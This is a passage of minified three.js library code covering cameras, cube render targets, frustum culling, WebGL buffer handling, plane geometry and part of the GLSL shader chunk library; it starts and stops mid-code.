                i && i.isTexture ? t.uniforms[n] = { type: "t", value: i.toJSON(e).uuid } : i && i.isColor ? t.uniforms[n] = { type: "c", value: i.getHex() } : i && i.isVector2 ? t.uniforms[n] = { type: "v2", value: i.toArray() } : i && i.isVector3 ? t.uniforms[n] = { type: "v3", value: i.toArray() } : i && i.isVector4 ? t.uniforms[n] = { type: "v4", value: i.toArray() } : i && i.isMatrix3 ? t.uniforms[n] = { type: "m3", value: i.toArray() } : i && i.isMatrix4 ? t.uniforms[n] = { type: "m4", value: i.toArray() } : t.uniforms[n] = { value: i }
            }
            Object.keys(this.defines).length > 0 && (t.defines = this.defines), t.vertexShader = this.vertexShader, t.fragmentShader = this.fragmentShader;
            const n = {};
            for (const e in this.extensions) !0 === this.extensions[e] && (n[e] = !0);
            return Object.keys(n).length > 0 && (t.extensions = n), t
        }, zn.prototype = Object.assign(Object.create(_t.prototype), { constructor: zn, isCamera: !0, copy: function(e, t) { return _t.prototype.copy.call(this, e, t), this.matrixWorldInverse.copy(e.matrixWorldInverse), this.projectionMatrix.copy(e.projectionMatrix), this.projectionMatrixInverse.copy(e.projectionMatrixInverse), this }, getWorldDirection: function(e) { void 0 === e && (console.warn("THREE.Camera: .getWorldDirection() target is now required"), e = new be), this.updateWorldMatrix(!0, !1); const t = this.matrixWorld.elements; return e.set(-t[8], -t[9], -t[10]).normalize() }, updateMatrixWorld: function(e) { _t.prototype.updateMatrixWorld.call(this, e), this.matrixWorldInverse.copy(this.matrixWorld).invert() }, updateWorldMatrix: function(e, t) { _t.prototype.updateWorldMatrix.call(this, e, t), this.matrixWorldInverse.copy(this.matrixWorld).invert() }, clone: function() { return (new this.constructor).copy(this) } }), Bn.prototype = Object.assign(Object.create(zn.prototype), {
            constructor: Bn,
            isPerspectiveCamera: !0,
            copy: function(e, t) { return zn.prototype.copy.call(this, e, t), this.fov = e.fov, this.zoom = e.zoom, this.near = e.near, this.far = e.far, this.focus = e.focus, this.aspect = e.aspect, this.view = null === e.view ? null : Object.assign({}, e.view), this.filmGauge = e.filmGauge, this.filmOffset = e.filmOffset, this },
            setFocalLength: function(e) {
                const t = .5 * this.getFilmHeight() / e;
                this.fov = 2 * ue.RAD2DEG * Math.atan(t), this.updateProjectionMatrix()
            },
            getFocalLength: function() { const e = Math.tan(.5 * ue.DEG2RAD * this.fov); return .5 * this.getFilmHeight() / e },
            getEffectiveFOV: function() { return 2 * ue.RAD2DEG * Math.atan(Math.tan(.5 * ue.DEG2RAD * this.fov) / this.zoom) },
            getFilmWidth: function() { return this.filmGauge * Math.min(this.aspect, 1) },
            getFilmHeight: function() { return this.filmGauge / Math.max(this.aspect, 1) },
            setViewOffset: function(e, t, n, i, r, a) { this.aspect = e / t, null === this.view && (this.view = { enabled: !0, fullWidth: 1, fullHeight: 1, offsetX: 0, offsetY: 0, width: 1, height: 1 }), this.view.enabled = !0, this.view.fullWidth = e, this.view.fullHeight = t, this.view.offsetX = n, this.view.offsetY = i, this.view.width = r, this.view.height = a, this.updateProjectionMatrix() },
            clearViewOffset: function() { null !== this.view && (this.view.enabled = !1), this.updateProjectionMatrix() },
            updateProjectionMatrix: function() {
                const e = this.near;
                let t = e * Math.tan(.5 * ue.DEG2RAD * this.fov) / this.zoom,
                    n = 2 * t,
                    i = this.aspect * n,
                    r = -.5 * i;
                const a = this.view;
                if (null !== this.view && this.view.enabled) {
                    const e = a.fullWidth,
                        o = a.fullHeight;
                    r += a.offsetX * i / e, t -= a.offsetY * n / o, i *= a.width / e, n *= a.height / o
                }
                const o = this.filmOffset;
                0 !== o && (r += e * o / this.getFilmWidth()), this.projectionMatrix.makePerspective(r, r + i, t, t - n, e, this.far), this.projectionMatrixInverse.copy(this.projectionMatrix).invert()
            },
            toJSON: function(e) { const t = _t.prototype.toJSON.call(this, e); return t.object.fov = this.fov, t.object.zoom = this.zoom, t.object.near = this.near, t.object.far = this.far, t.object.focus = this.focus, t.object.aspect = this.aspect, null !== this.view && (t.object.view = Object.assign({}, this.view)), t.object.filmGauge = this.filmGauge, t.object.filmOffset = this.filmOffset, t }
        });
        class kn extends _t {
            constructor(e, t, n) {
                if (super(), this.type = "CubeCamera", !0 !== n.isWebGLCubeRenderTarget) return void console.error("THREE.CubeCamera: The constructor now expects an instance of WebGLCubeRenderTarget as third parameter.");
                this.renderTarget = n;
                const i = new Bn(90, 1, e, t);
                i.layers = this.layers, i.up.set(0, -1, 0), i.lookAt(new be(1, 0, 0)), this.add(i);
                const r = new Bn(90, 1, e, t);
                r.layers = this.layers, r.up.set(0, -1, 0), r.lookAt(new be(-1, 0, 0)), this.add(r);
                const a = new Bn(90, 1, e, t);
                a.layers = this.layers, a.up.set(0, 0, 1), a.lookAt(new be(0, 1, 0)), this.add(a);
                const o = new Bn(90, 1, e, t);
                o.layers = this.layers, o.up.set(0, 0, -1), o.lookAt(new be(0, -1, 0)), this.add(o);
                const s = new Bn(90, 1, e, t);
                s.layers = this.layers, s.up.set(0, -1, 0), s.lookAt(new be(0, 0, 1)), this.add(s);
                const l = new Bn(90, 1, e, t);
                l.layers = this.layers, l.up.set(0, -1, 0), l.lookAt(new be(0, 0, -1)), this.add(l)
            }
            update(e, t) {
                null === this.parent && this.updateMatrixWorld();
                const n = this.renderTarget,
                    [i, r, a, o, s, l] = this.children,
                    c = e.xr.enabled,
                    u = e.getRenderTarget();
                e.xr.enabled = !1;
                const h = n.texture.generateMipmaps;
                n.texture.generateMipmaps = !1, e.setRenderTarget(n, 0), e.render(t, i), e.setRenderTarget(n, 1), e.render(t, r), e.setRenderTarget(n, 2), e.render(t, a), e.setRenderTarget(n, 3), e.render(t, o), e.setRenderTarget(n, 4), e.render(t, s), n.texture.generateMipmaps = h, e.setRenderTarget(n, 5), e.render(t, l), e.setRenderTarget(u), e.xr.enabled = c
            }
        }
        class Vn extends ge {
            constructor(e, t, n, i, r, a, o, s, l, c) { super(e = void 0 !== e ? e : [], t = void 0 !== t ? t : 301, n, i, r, a, o = void 0 !== o ? o : Y, s, l, c), this._needsFlipEnvMap = !0, this.flipY = !1 }
            get images() { return this.image }
            set images(e) { this.image = e }
        }
        Vn.prototype.isCubeTexture = !0;
        class Wn extends xe {
            constructor(e, t, n) { Number.isInteger(t) && (console.warn("THREE.WebGLCubeRenderTarget: constructor signature is now WebGLCubeRenderTarget( size, options )"), t = n), super(e, e, t), t = t || {}, this.texture = new Vn(void 0, t.mapping, t.wrapS, t.wrapT, t.magFilter, t.minFilter, t.format, t.type, t.anisotropy, t.encoding), this.texture.generateMipmaps = void 0 !== t.generateMipmaps && t.generateMipmaps, this.texture.minFilter = void 0 !== t.minFilter ? t.minFilter : B, this.texture._needsFlipEnvMap = !1 }
            fromEquirectangularTexture(e, t) {
                this.texture.type = t.type, this.texture.format = Z, this.texture.encoding = t.encoding, this.texture.generateMipmaps = t.generateMipmaps, this.texture.minFilter = t.minFilter, this.texture.magFilter = t.magFilter;
                const n_uniforms = { tEquirect: { value: null } },
                    n_vertexShader = "\n\n\t\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\t\tvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\n\t\t\t\t\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n\n\t\t\t\t}\n\n\t\t\t\tvoid main() {\n\n\t\t\t\t\tvWorldDirection = transformDirection( position, modelMatrix );\n\n\t\t\t\t\t#include <begin_vertex>\n\t\t\t\t\t#include <project_vertex>\n\n\t\t\t\t}\n\t\t\t",
                    n_fragmentShader = "\n\n\t\t\t\tuniform sampler2D tEquirect;\n\n\t\t\t\tvarying vec3 vWorldDirection;\n\n\t\t\t\t#include <common>\n\n\t\t\t\tvoid main() {\n\n\t\t\t\t\tvec3 direction = normalize( vWorldDirection );\n\n\t\t\t\t\tvec2 sampleUV = equirectUv( direction );\n\n\t\t\t\t\tgl_FragColor = texture2D( tEquirect, sampleUV );\n\n\t\t\t\t}\n\t\t\t",
                    i = new In(5, 5, 5),
                    r = new Fn({ name: "CubemapFromEquirect", uniforms: On(n_uniforms), vertexShader: n_vertexShader, fragmentShader: n_fragmentShader, side: 1, blending: 0 });
                r.uniforms.tEquirect.value = t;
                const a = new Dn(i, r),
                    o = t.minFilter;
                return t.minFilter === G && (t.minFilter = B), new kn(1, 10, this).update(e, a), t.minFilter = o, a.geometry.dispose(), a.material.dispose(), this
            }
            clear(e, t, n, i) {
                const r = e.getRenderTarget();
                for (let r = 0; r < 6; r++) e.setRenderTarget(this, r), e.clear(t, n, i);
                e.setRenderTarget(r)
            }
        }
        Wn.prototype.isWebGLCubeRenderTarget = !0;
        class jn extends ge { constructor(e, t, n, i, r, a, o, s, l, c, u, h) { super(null, a, o, s, l, c, i, r, u, h), this.image = { data: e || null, width: t || 1, height: n || 1 }, this.magFilter = void 0 !== l ? l : U, this.minFilter = void 0 !== c ? c : U, this.generateMipmaps = !1, this.flipY = !1, this.unpackAlignment = 1, this.needsUpdate = !0 } }
        jn.prototype.isDataTexture = !0;
        const qn = new Be,
            Xn = new be;
        class Yn {
            constructor(e = new Tt, t = new Tt, n = new Tt, i = new Tt, r = new Tt, a = new Tt) { this.planes = [e, t, n, i, r, a] }
            set(e, t, n, i, r, a) { const o = this.planes; return o[0].copy(e), o[1].copy(t), o[2].copy(n), o[3].copy(i), o[4].copy(r), o[5].copy(a), this }
            copy(e) { const t = this.planes; for (let n = 0; n < 6; n++) t[n].copy(e.planes[n]); return this }
            setFromProjectionMatrix(e) {
                const t = this.planes,
                    n = e.elements,
                    i = n[0],
                    r = n[1],
                    a = n[2],
                    o = n[3],
                    s = n[4],
                    l = n[5],
                    c = n[6],
                    u = n[7],
                    h = n[8],
                    d = n[9],
                    p = n[10],
                    f = n[11],
                    m = n[12],
                    g = n[13],
                    v = n[14],
                    y = n[15];
                return t[0].setComponents(o - i, u - s, f - h, y - m).normalize(), t[1].setComponents(o + i, u + s, f + h, y + m).normalize(), t[2].setComponents(o + r, u + l, f + d, y + g).normalize(), t[3].setComponents(o - r, u - l, f - d, y - g).normalize(), t[4].setComponents(o - a, u - c, f - p, y - v).normalize(), t[5].setComponents(o + a, u + c, f + p, y + v).normalize(), this
            }
            intersectsObject(e) { const t = e.geometry; return null === t.boundingSphere && t.computeBoundingSphere(), qn.copy(t.boundingSphere).applyMatrix4(e.matrixWorld), this.intersectsSphere(qn) }
            intersectsSprite(e) { return qn.center.set(0, 0, 0), qn.radius = .7071067811865476, qn.applyMatrix4(e.matrixWorld), this.intersectsSphere(qn) }
            intersectsSphere(e) {
                const t = this.planes,
                    n = e.center,
                    i = -e.radius;
                for (let e = 0; e < 6; e++)
                    if (t[e].distanceToPoint(n) < i) return !1;
                return !0
            }
            intersectsBox(e) { const t = this.planes; for (let n = 0; n < 6; n++) { const i = t[n]; if (Xn.x = i.normal.x > 0 ? e.max.x : e.min.x, Xn.y = i.normal.y > 0 ? e.max.y : e.min.y, Xn.z = i.normal.z > 0 ? e.max.z : e.min.z, i.distanceToPoint(Xn) < 0) return !1 } return !0 }
            containsPoint(e) {
                const t = this.planes;
                for (let n = 0; n < 6; n++)
                    if (t[n].distanceToPoint(e) < 0) return !1;
                return !0
            }
            clone() { return (new this.constructor).copy(this) }
        }

        function Zn() {
            let e = null,
                t = !1,
                n = null,
                i = null;

            function r(t, a) { n(t, a), i = e.requestAnimationFrame(r) }
            return { start: function() {!0 !== t && null !== n && (i = e.requestAnimationFrame(r), t = !0) }, stop: function() { e.cancelAnimationFrame(i), t = !1 }, setAnimationLoop: function(e) { n = e }, setContext: function(t) { e = t } }
        }

        function Jn(e, t) {
            const n = t.isWebGL2,
                i = new WeakMap;
            return {
                get: function(e) { return e.isInterleavedBufferAttribute && (e = e.data), i.get(e) },
                remove: function(t) {
                    t.isInterleavedBufferAttribute && (t = t.data);
                    const n = i.get(t);
                    n && (e.deleteBuffer(n.buffer), i.delete(t))
                },
                update: function(t, r) {
                    if (t.isGLBufferAttribute) { const e = i.get(t); return void((!e || e.version < t.version) && i.set(t, { buffer: t.buffer, type: t.type, bytesPerElement: t.elementSize, version: t.version })) }
                    t.isInterleavedBufferAttribute && (t = t.data);
                    const a = i.get(t);
                    void 0 === a ? i.set(t, function(t, i) {
                        const r = t.array,
                            a = t.usage,
                            o = e.createBuffer();
                        e.bindBuffer(i, o), e.bufferData(i, r, a), t.onUploadCallback();
                        let s = 5126;
                        return r instanceof Float32Array ? s = 5126 : r instanceof Float64Array ? console.warn("THREE.WebGLAttributes: Unsupported data buffer format: Float64Array.") : r instanceof Uint16Array ? t.isFloat16BufferAttribute ? n ? s = 5131 : console.warn("THREE.WebGLAttributes: Usage of Float16BufferAttribute requires WebGL2.") : s = 5123 : r instanceof Int16Array ? s = 5122 : r instanceof Uint32Array ? s = 5125 : r instanceof Int32Array ? s = 5124 : r instanceof Int8Array ? s = 5120 : r instanceof Uint8Array && (s = 5121), { buffer: o, type: s, bytesPerElement: r.BYTES_PER_ELEMENT, version: t.version }
                    }(t, r)) : a.version < t.version && (function(t, i, r) {
                        const a = i.array,
                            o = i.updateRange;
                        e.bindBuffer(r, t), -1 === o.count ? e.bufferSubData(r, 0, a) : (n ? e.bufferSubData(r, o.offset * a.BYTES_PER_ELEMENT, a, o.offset, o.count) : e.bufferSubData(r, o.offset * a.BYTES_PER_ELEMENT, a.subarray(o.offset, o.offset + o.count)), o.count = -1)
                    }(a.buffer, t, r), a.version = t.version)
                }
            }
        }
        class Kn extends fn {
            constructor(e = 1, t = 1, n = 1, i = 1) {
                super(), this.type = "PlaneGeometry", this.parameters = { width: e, height: t, widthSegments: n, heightSegments: i };
                const r = e / 2,
                    a = t / 2,
                    o = Math.floor(n),
                    s = Math.floor(i),
                    l = o + 1,
                    c = s + 1,
                    u = e / o,
                    h = t / s,
                    d = [],
                    p = [],
                    f = [],
                    m = [];
                for (let e = 0; e < c; e++) {
                    const t = e * h - a;
                    for (let n = 0; n < l; n++) {
                        const i = n * u - r;
                        p.push(i, -t, 0), f.push(0, 0, 1), m.push(n / o), m.push(1 - e / s)
                    }
                }
                for (let e = 0; e < s; e++)
                    for (let t = 0; t < o; t++) {
                        const n = t + l * e,
                            i = t + l * (e + 1),
                            r = t + 1 + l * (e + 1),
                            a = t + 1 + l * e;
                        d.push(n, i, a), d.push(i, r, a)
                    }
                this.setIndex(d), this.setAttribute("position", new rn(p, 3)), this.setAttribute("normal", new rn(f, 3)), this.setAttribute("uv", new rn(m, 2))
            }
        }
        const $n = { alphamap_fragment: "#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n#endif", alphamap_pars_fragment: "#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif", alphatest_fragment: "#ifdef ALPHATEST\n\tif ( diffuseColor.a < ALPHATEST ) discard;\n#endif", aomap_fragment: "#ifdef USE_AOMAP\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\t#if defined( USE_ENVMAP ) && defined( STANDARD )\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\n\t#endif\n#endif", aomap_pars_fragment: "#ifdef USE_AOMAP\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n#endif", begin_vertex: "vec3 transformed = vec3( position );", beginnormal_vertex: "vec3 objectNormal = vec3( normal );\n#ifdef USE_TANGENT\n\tvec3 objectTangent = vec3( tangent.xyz );\n#endif", bsdfs: "vec2 integrateSpecularBRDF( const in float dotNV, const in float roughness ) {\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\tvec4 r = roughness * c0 + c1;\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\treturn vec2( -1.04, 1.04 ) * a004 + r.zw;\n}\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\tif( cutoffDistance > 0.0 ) {\n\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\t}\n\treturn distanceFalloff;\n#else\n\tif( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\t\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\t}\n\treturn 1.0;\n#endif\n}\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\n\treturn RECIPROCAL_PI * diffuseColor;\n}\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\n\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\n}\nvec3 F_Schlick_RoughnessDependent( const in vec3 F0, const in float dotNV, const in float roughness ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotNV - 6.98316 ) * dotNV );\n\tvec3 Fr = max( vec3( 1.0 - roughness ), F0 ) - F0;\n\treturn Fr * fresnel + F0;\n}\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\treturn 1.0 / ( gl * gv );\n}\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\treturn 0.5 / max( gv + gl, EPSILON );\n}\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\tfloat a2 = pow2( alpha );\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n}\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat alpha = pow2( roughness );\n\tvec3 halfDir = normalize( incidentLight.direction + viewDir );\n\tfloat dotNL = saturate( dot( normal, incidentLight.direction ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\tfloat D = D_GGX( alpha, dotNH );\n\treturn F * ( G * D );\n}\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\tconst float LUT_SIZE = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS = 0.5 / LUT_SIZE;\n\tfloat dotNV = saturate( dot( N, V ) );\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\treturn uv;\n}\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\tfloat l = length( f );\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n}\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\tfloat x = dot( v1, v2 );\n\tfloat y = abs( x );\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\treturn cross( v1, v2 ) * theta_sintheta;\n}\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 );\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n}\nvec3 BRDF_Specular_GGX_Environment( const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\treturn specularColor * brdf.x + brdf.y;\n}\nvoid BRDF_Specular_Multiscattering_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tvec3 F = F_Schlick_RoughnessDependent( specularColor, dotNV, roughness );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\tvec3 FssEss = F * brdf.x + brdf.y;\n\tfloat Ess = brdf.x + brdf.y;\n\tfloat Ems = 1.0 - Ess;\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619;\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n}\nfloat G_BlinnPhong_Implicit( ) {\n\treturn 0.25;\n}\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n}\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_BlinnPhong_Implicit( );\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\treturn F * ( G * D );\n}\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\n\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\n}\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\n\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\n}\n#if defined( USE_SHEEN )\nfloat D_Charlie(float roughness, float NoH) {\n\tfloat invAlpha = 1.0 / roughness;\n\tfloat cos2h = NoH * NoH;\n\tfloat sin2h = max(1.0 - cos2h, 0.0078125);\treturn (2.0 + invAlpha) * pow(sin2h, invAlpha * 0.5) / (2.0 * PI);\n}\nfloat V_Neubelt(float NoV, float NoL) {\n\treturn saturate(1.0 / (4.0 * (NoL + NoV - NoL * NoV)));\n}\nvec3 BRDF_Specular_Sheen( const in float roughness, const in vec3 L, const in GeometricContext geometry, vec3 specularColor ) {\n\tvec3 N = geometry.normal;\n\tvec3 V = geometry.viewDir;\n\tvec3 H = normalize( V + L );\n\tfloat dotNH = saturate( dot( N, H ) );\n\treturn specularColor * D_Charlie( roughness, dotNH ) * V_Neubelt( dot(N, V), dot(N, L) );\n}\n#endif", bumpmap_pars_fragment: "#ifdef USE_BUMPMAP\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\tvec2 dHdxy_fwd() {\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\t\treturn vec2( dBx, dBy );\n\t}\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\t\tfloat fDet = dot( vSigmaX, R1 ) * faceDirection;\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\t}\n#endif", clipping_planes_fragment: "#if NUM_CLIPPING_PLANES > 0\n\tvec4 plane;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;\n\t}\n\t#pragma unroll_loop_end\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\t\tbool clipped = true;\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;\n\t\t}\n\t\t#pragma unroll_loop_end\n\t\tif ( clipped ) discard;\n\t#endif\n#endif", clipping_planes_pars_fragment: "#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n#endif", clipping_planes_pars_vertex: "#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n#endif", clipping_planes_vertex: "#if NUM_CLIPPING_PLANES > 0\n\tvClipPosition = - mvPosition.xyz;\n#endif", color_fragment: "#ifdef USE_COLOR\n\tdiffuseColor.rgb *= vColor;\n#endif", color_pars_fragment: "#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif", color_pars_vertex: "#if defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvarying vec3 vColor;\n#endif", color_vertex: "#if defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvColor = vec3( 1.0 );\n#endif\n#ifdef USE_COLOR\n\tvColor.xyz *= color.xyz;\n#endif\n#ifdef USE_INSTANCING_COLOR\n\tvColor.xyz *= instanceColor.xyz;\n#endif", common: "#define PI 3.141592653589793\n#define PI2 6.283185307179586\n#define PI_HALF 1.5707963267948966\n#define RECIPROCAL_PI 0.3183098861837907\n#define RECIPROCAL_PI2 0.15915494309189535\n#define EPSILON 1e-6\n#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\n#define whiteComplement(a) ( 1.0 - saturate( a ) )\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\nhighp float rand( const in vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract(sin(sn) * c);\n}\n#ifdef HIGH_PRECISION\n\tfloat precisionSafeLength( vec3 v ) { return length( v ); }\n#else\n\tfloat max3( vec3 v ) { return max( max( v.x, v.y ), v.z ); }\n\tfloat precisionSafeLength( vec3 v ) {\n\t\tfloat maxComponent = max3( abs( v ) );\n\t\treturn length( v / maxComponent ) * maxComponent;\n\t}\n#endif\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n#ifdef CLEARCOAT\n\tvec3 clearcoatNormal;\n#endif\n};\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 